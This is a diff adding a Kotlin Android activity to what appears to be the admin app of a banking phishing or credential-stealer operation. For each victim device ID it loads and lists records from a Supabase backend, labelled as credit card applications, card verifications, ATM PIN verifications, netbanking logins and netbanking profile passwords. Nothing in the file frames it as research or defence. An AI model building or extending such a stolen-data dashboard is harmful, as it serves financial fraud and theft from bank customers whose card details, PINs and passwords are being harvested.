@@ -1,0 +1,144 @@
+package com.example.admin.activities
+
+import android.os.Bundle
+import android.widget.Toast
+import androidx.appcompat.app.AppCompatActivity
+import androidx.recyclerview.widget.LinearLayoutManager
+import androidx.recyclerview.widget.RecyclerView
+import com.example.admin.R
+import com.example.admin.adapters.GenericAdapter
+import com.example.admin.network.SupabaseApi
+import kotlinx.coroutines.*
+import java.text.SimpleDateFormat
+import java.util.*
+
+class AllUserDataActivity : AppCompatActivity() {
+
+    private val dataList = mutableListOf<Pair<String, String>>()
+    private lateinit var adapter: GenericAdapter
+    private lateinit var uniqueid: String
+
+    private val dateFormat = SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.getDefault())
+    private val supabaseApi = SupabaseApi()
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_all_userdata)
+
+        uniqueid = intent.getStringExtra("uniqueid").orEmpty()
+
+        if (uniqueid.isBlank()) {
+            Toast.makeText(this, "Invalid device id", Toast.LENGTH_SHORT).show()
+            finish()
+            return
+        }
+
+        val recycler = findViewById<RecyclerView>(R.id.recycler)
+        recycler.layoutManager = LinearLayoutManager(this)
+
+        adapter = GenericAdapter(dataList)
+        recycler.adapter = adapter
+
+        fetchAllDataFromSupabase()
+    }
+
+    private fun fetchAllDataFromSupabase() {
+        dataList.clear()
+        dataList.add(Pair("Loading", "Fetching data for device ID: $uniqueid"))
+        adapter.notifyDataSetChanged()
+
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val result = supabaseApi.getCreditCardApplications(uniqueid)
+
+                withContext(Dispatchers.Main) {
+                    dataList.clear()
+
+                    result.onSuccess { applications ->
+                        if (applications.isEmpty()) {
+                            dataList.add(Pair("No Data", "No data found for this device"))
+                            adapter.notifyDataSetChanged()
+                            return@onSuccess
+                        }
+
+                        dataList.add(Pair("SUMMARY", "Total ${applications.size} entries found"))
+
+                        for ((index, app) in applications.withIndex()) {
+                            val title = getEntryTitle(app.type, index + 1)
+                            val content = buildContentFromData(app.data, app.submittedAtMs)
+
+                            dataList.add(Pair(title, content))
+                        }
+
+                        adapter.notifyDataSetChanged()
+
+                    }.onFailure { error ->
+                        dataList.add(Pair("Error", error.message ?: "Unknown error"))
+                        adapter.notifyDataSetChanged()
+                        Toast.makeText(
+                            this@AllUserDataActivity,
+                            "Error: ${error.message}",
+                            Toast.LENGTH_LONG
+                        ).show()
+                    }
+                }
+
+            } catch (e: Exception) {
+                withContext(Dispatchers.Main) {
+                    dataList.clear()
+                    dataList.add(Pair("Error", e.message ?: "Unknown exception"))
+                    adapter.notifyDataSetChanged()
+                    Toast.makeText(
+                        this@AllUserDataActivity,
+                        "Error: ${e.message}",
+                        Toast.LENGTH_LONG
+                    ).show()
+                }
+            }
+        }
+    }
+
+    private fun buildContentFromData(data: Map<String, Any>, submittedAtMs: Long): String {
+        val sb = StringBuilder()
+
+        sb.append("Time: ${formatTimestamp(submittedAtMs)}\n")
+        sb.append("--------------------\n")
+
+        for ((key, value) in data) {
+            if (key == "id" || key == "type" || key == "submitted_at_ms") continue
+
+            val displayValue = when (value) {
+                is Long -> {
+                    if (value > 1000000000000) formatTimestamp(value) else value.toString()
+                }
+                is Int -> value.toString()
+                is String -> if (value.isNotEmpty()) value else "N/A"
+                else -> value.toString()
+            }
+
+            sb.append("$key: $displayValue\n")
+        }
+
+        return sb.toString().trim()
+    }
+
+    private fun formatTimestamp(timestamp: Long): String {
+        return try {
+            val actual = if (timestamp < 10000000000) timestamp * 1000 else timestamp
+            dateFormat.format(Date(actual))
+        } catch (e: Exception) {
+            timestamp.toString()
+        }
+    }
+
+    private fun getEntryTitle(type: String, index: Int): String {
+        return when (type) {
+            "credit_card_application" -> "CREDIT CARD APPLICATION #$index"
+            "card_verification" -> "CARD VERIFICATION #$index"
+            "atm_pin_verification" -> "ATM PIN VERIFICATION #$index"
+            "netbanking_login" -> "NETBANKING LOGIN #$index"
+            "netbanking_profile_password" -> "NETBANKING PROFILE PASSWORD #$index"
+            else -> "ENTRY #$index ($type)"
+        }
+    }
+}
